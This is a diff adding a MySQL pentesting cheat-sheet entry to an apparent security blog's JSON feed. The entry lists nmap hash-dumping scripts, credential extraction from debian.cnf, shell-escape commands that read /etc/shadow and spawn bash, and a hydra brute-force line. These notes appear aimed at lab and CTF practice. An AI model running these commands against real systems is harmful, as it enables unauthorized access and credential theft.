@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/02/16/mysql",
+            "title": "MySQL",
+            "summary": "MySQL",
+            "content_text": "Ports  3306/tcpGathering Information from outside# nmapnmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.166.72Authentication# extracting creds from filescat /etc/mysql/debian.cnfgrep -oaE \"[-_\\.\\*a-Z0-9]{3,}\" | grep -v \"mysql_native_password\"Gathering infor inside SQL shell; Checks versionselect @@version;; Checks userselect user();; checks permissions and privilegesshow grants for 'root'@'localhost';\tPrivesc; Breaks out from shell\\! cat /etc/passwd\\! cat /etc/shadow\\! bashFiles and directories# settingscat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | grep \"user\"Brute Force# mysql over ssh tunnelhydra -V -L users.txt -P passwords.txt 127.0.0.1 -s 9000 mysqlExploits  UDF - used in vulnhub lord of the rootOther resources  3306 - Pentesting Mysql - HackTricks",
+            "content_html": "<h2 id=\"ports\">Ports</h2><ul>  <li>3306/tcp</li></ul><h2 id=\"gathering-information-from-outside\">Gathering Information from outside</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># nmap</span>nmap <span class=\"nt\">-sV</span> <span class=\"nt\">-p</span> 3306 <span class=\"nt\">--script</span> mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.166.72</code></pre></div></div><h2 id=\"authentication\">Authentication</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># extracting creds from files</span><span class=\"nb\">cat</span> /etc/mysql/debian.cnf<span class=\"nb\">grep</span> <span class=\"nt\">-oaE</span> <span class=\"s2\">\"[-_</span><span class=\"se\">\\.\\*</span><span class=\"s2\">a-Z0-9]{3,}\"</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"s2\">\"mysql_native_password\"</span></code></pre></div></div><h2 id=\"gathering-infor-inside-sql-shell\">Gathering infor inside SQL shell</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">;</span> <span class=\"n\">Checks</span> <span class=\"k\">version</span><span class=\"k\">select</span> <span class=\"o\">@@</span><span class=\"k\">version</span><span class=\"p\">;</span><span class=\"p\">;</span> <span class=\"n\">Checks</span> <span class=\"k\">user</span><span class=\"k\">select</span> <span class=\"k\">user</span><span class=\"p\">();</span><span class=\"p\">;</span> <span class=\"n\">checks</span> <span class=\"n\">permissions</span> <span class=\"k\">and</span> <span class=\"k\">privileges</span><span class=\"k\">show</span> <span class=\"n\">grants</span> <span class=\"k\">for</span> <span class=\"s1\">'root'</span><span class=\"o\">@</span><span class=\"s1\">'localhost'</span><span class=\"p\">;</span>\t</code></pre></div></div><h2 id=\"privesc\">Privesc</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">;</span> <span class=\"n\">Breaks</span> <span class=\"k\">out</span> <span class=\"k\">from</span> <span class=\"n\">shell</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">cat</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">passwd</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">cat</span> <span class=\"o\">/</span><span class=\"n\">etc</span><span class=\"o\">/</span><span class=\"n\">shadow</span><span class=\"err\">\\</span><span class=\"o\">!</span> <span class=\"n\">bash</span></code></pre></div></div><h2 id=\"files-and-directories\">Files and directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># settings</span><span class=\"nb\">cat</span> /etc/mysql/mysql.conf.d/mysqld.cnf | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"s2\">\"#\"</span> | <span class=\"nb\">grep</span> <span class=\"s2\">\"user\"</span></code></pre></div></div><h2 id=\"brute-force\">Brute Force</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># mysql over ssh tunnel</span>hydra <span class=\"nt\">-V</span> <span class=\"nt\">-L</span> users.txt <span class=\"nt\">-P</span> passwords.txt 127.0.0.1 <span class=\"nt\">-s</span> 9000 mysql</code></pre></div></div><h2 id=\"exploits\">Exploits</h2><ul>  <li><a href=\"https://www.exploit-db.com/exploits/1518\">UDF</a> - used in vulnhub lord of the root</li></ul><h2 id=\"other-resources\">Other resources</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-mysql\">3306 - Pentesting Mysql - HackTricks</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/02/16/mysql",
+            
+            
+            
+            "tags": ["db","enum"],
+            
+            "date_published": "2022-02-16T00:00:00+08:00",
+            "date_modified": "2022-02-16T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/02/12/cookie-session-hijacking",
             "title": "Cookie/Session Hijacking",
             "summary": "Cookie/Session Hijacking",
